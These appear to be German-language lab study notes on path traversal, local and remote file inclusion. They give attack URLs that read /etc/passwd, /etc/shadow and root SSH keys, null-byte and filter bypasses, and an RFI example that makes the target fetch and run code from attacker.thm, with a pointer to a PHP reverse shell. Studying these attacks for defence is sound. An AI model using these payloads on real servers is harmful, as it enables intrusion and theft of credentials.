### Was Das?
Generell werden File Inclusions aufgeteilt in Local und Remote File Inclusions (LFI und RFI) und generelles Directory Traversal. 

Die Lücken können Auftreten Da Websites Teilweise so geschrieben sind das sie z.B. Bilder, statischen Text usw., über Parameter anfordern. Parameter sind Abfrageparameter-Strings, die an die URL angehängt werden und zum Abrufen von Daten oder zur Durchführung von Aktionen auf der Grundlage von Benutzereingaben verwendet werden können. Im folgenden Diagramm sind die wesentlichen Bestandteile einer URL dargestellt.

https://imgur.com/ar0UxEZ

Das Hauptproblem bei diesen Schwachstellen ist die Eingabevalidierung, bei der die Benutzereingaben nicht bereinigt oder validiert werden und der Benutzer sie kontrolliert. Wenn die Eingabe nicht validiert wird, kann der Benutzer jede beliebige Eingabe an die Funktion übergeben, was die Sicherheitslücke verursacht. 


### Path Traversal
Auch bekannt als Directory Traversal. Eine Web-Sicherheitslücke ermöglicht es einem Angreifer, Betriebssystem-Ressourcen, wie z. B. lokale Dateien auf dem Server, auf dem eine Anwendung läuft, zu lesen. Der Angreifer nutzt diese Sicherheitslücke aus, indem er die URL der Webanwendung manipuliert und missbraucht, um Dateien oder Verzeichnisse zu finden und darauf zuzugreifen, die außerhalb des Stammverzeichnisses der Anwendung gespeichert sind.

###### dot dot Slash angriff
nutzt die funktion das mit jedem ../ das Directory eins nach oben gemoved wird quasi wie cd..
Wenn der Angreifer einen Eintrittspunkt wie zum Beispiel ein ***get.php?file=*** darauf hin kann der Angreifer etwas in diese richtung schicken 

```
http://webapp.thm/get.php?file=../../../../etc/passwd
```

Angenommen, es gibt keine Eingabeüberprüfung, und statt auf die PDF-Dateien unter /var/www/app/CVs zuzugreifen, ruft die Webanwendung Dateien aus anderen Verzeichnissen ab, in diesem Fall /etc/passwd. Jeder .. Eintrag bewegt sich um ein Verzeichnis, bis er das Stammverzeichnis / erreicht. Dann wechselt er das Verzeichnis zu /etc und liest von dort die Datei passwd.

Beispiel Bild: 
https://imgur.com/szBSssW

Intressant Locations an die man Navigieren kann

|   |   |
|---|---|
|**Location**|**Description**|
|`/etc/issue`|contains a message or system identification to be printed before the login prompt.|
|`/etc/profile`|controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived|
|`/proc/version`|specifies the version of the Linux kernel|
|`etc/passwd`|has all registered users that have access to a system|
|`/etc/shadow`|contains information about the system's users' passwords|
|`/root/.bash_history`|contains the history commands for `root` user|
|`/var/log/dmessage`|contains global system messages, including the messages that are logged during system startup|
|`/var/mail/root`|all emails for `root` user|
|`/root/.ssh/id_rsa`|Private SSH keys for a root or any known valid user on the server|
|`/var/log/apache2/access.log`|the accessed requests for `Apache` web server|
|`C:\boot.ini`|contains the boot options for computers with BIOS firmware|


#### Current Directory Trick
Wird Genutzt wenn der Developer begriffe/Pfade gefiltert hat wie z.B. /etc/passwd
Was man jetzt machen kann ist der "Current Directory Trick" dieser funktioniert ähnlich wie "cd". Während cd.. uns ein Directory nach oben bringt bleibt cd. im selben Directory 
Bsp.:
http://webapp.thm/index.php?lang=/etc/passwd/.

### LFI

Kann wie Path Traversal die dot dot Slash methode Benutzen. Kann aber auch schon jenachdem einfachere Variante nutzen 


wie z.B. die gesuchte Datei an die URL anheften. Dies funktioniert wenn im Query code kein Direcory Spezifiziert ist. 
Bsp.
http://10.10.208.102//lab1.php?file=/etc/passwd


Wenn ein Directory Spezifiziert ist kann die Dot Dot Slash methode verwendet werden. 
Bsp.:
http://10.10.208.102/lab2.php?file=../../../../etc/passwd


Vorgehen beim Angreifen einer "Black Box"
Bsp.:
Entry Point 
http://webapp.thm/index.php?lang=EN
Beim eingeben eines Inputs kommt diese Fehlermeldung
```
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
Was Erfahren wir aus der Meldung? 
-> Da wir THM als input genommen haben erfahren wir das es eine Include Funktion gibt (So im etwa: include(languages/THM.php);)
-> Wir sehen das der Input via PHP gehandelt wird
-> Der Pfad der Applikation ist /var/www/html/THM-4/

	-> Mögliche Angriffmethodik ist Dot Dot Slash 
	http://webapp.thm/index.php?lang=../../../../etc/passwd

Fehlermeldung aus dem Befehl:

```
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
```
Rückschlüsse aus der Meldung: 
-> Anscheinend sind wir aus dem Verzeichniss raus gekommen allerdings wird an den input noch .php gehangen
-> das .php kann via eines NULLBYTES entfernt werden (%00)
- Modifizierte Angriffsmethodik:
- http://webapp.thm/index.php?lang=../../../../etc/passwd%00
**Note:** the %00 trick is fixed and not working with PHP 5.3.4 and above.

#### Was Tun wenn ../ durch durch Leerzeichen Ersetzt?

Einfach da nur der erste Substring durch PHP ersetzt wird kann man das wie Folgt bypassen: 
 ....//....//....//....//....//etc/passwd
 Bildliche Erklärung:
 https://imgur.com/aYrz6QC

#### Was tun wenn der Dev die Anfrage Forced durch ein Spezielles Directory laufen zu lassen?
Beispielpfad:
http://webapp.thm/index.php?lang=languages/EN.php
kann wie Folgt ausgehebelt werden: 
http://webapp.thm/index.php?lang=languages/../../../../../etc/passwd


### RFI -Remote File Incluson
Remote File Inclusion (RFI) ist eine Technik zur Einbindung von Remote Files in eine anfällige Anwendung. Wie LFI tritt RFI auf, wenn Benutzereingaben nicht ordnungsgemäß bereinigt werden, so dass ein Angreifer eine externe URL in die Include-Funktion einfügen kann. Eine Voraussetzung für RFI ist, dass die Option allow_url_fopen aktiviert sein muss.
Das Risiko eines RFI-Angriffs ist höher als das eines LFI-Angriffs, da RFI-Schwachstellen es einem Angreifer ermöglichen, Remote Command Execution (RCE) auf dem Server zu erlangen. 

Weitere Folgen eines erfolgreichen RFI-Angriffs sind:

- Offenlegung sensibler Informationen
- Cross-Site Scripting (XSS)
- Denial of Service (DoS)

Bildliches Beispiel
https://imgur.com/7JxRw1l

Schriftliches Beispiel 
Eine Website mit der URL http://webapp.thm/ hat eine Input möglichkeit für Sprachpakete die nicht korrekt gefiltert wird. 
Wir hosten einen Server der eine datei namens cmd.txt hostet (URL  http://attacker.thm/cmd.txt)
Dem Zielserver senden wir die Anfrage "http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt"
Dadurch das der Input vom Ziel nicht validiert wird geht die URL in die Include Funktion und sendet damit eine GET Request an unseren server und fragt die cmd.txt ab. 
Wenn die cmd.txt erfolgreich abgerufen ist führt die PHP Funktion diese auch direkt aus und wir bekommen die rückmeldung das dass script lief 

Hier kann man auch Beispielhaft .php Reverseshells nutzen 
https://pentestmonkey.net/tools/web-shells/php-reverse-shell
